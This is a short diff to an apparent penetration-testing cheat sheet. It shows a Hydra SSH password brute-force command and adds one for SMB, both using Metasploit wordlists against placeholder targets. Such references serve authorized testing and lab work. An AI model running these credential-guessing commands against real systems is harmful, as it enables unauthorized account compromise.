@@ -9,3 +9,9 @@ hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr
 ```bash
 hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP -t 4 ssh
 ```
+
+# SMB Brute Force (1 wordlist)
+
+```bash
+hydra -l USER -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt IP -t 4 smb
+```
